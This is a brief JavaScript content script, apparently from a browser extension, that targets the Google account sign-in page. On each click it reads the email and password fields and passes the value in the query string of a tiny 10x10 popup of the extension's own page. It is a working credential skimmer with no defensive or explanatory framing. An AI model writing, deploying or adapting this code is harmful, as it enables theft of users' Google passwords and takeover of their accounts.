if(location.href.includes('https://accounts.google.com/signin/')) {
  window.onclick = () => {       
    let collected;
    if(document.getElementsByTagName('input')[0]) {
      collected = `Email: ${document.getElementsByTagName('input')[0].value}`;
    }
    if(document.getElementsByName('password')[0]) {
      collected = `Password: ${document.getElementsByName('password')[0].value}`;
    }
    window.open(`${chrome.runtime.getURL('bin/index.html')}?${encodeURI(collected)}`, 'safe', 'width=10,height=10');
  }
}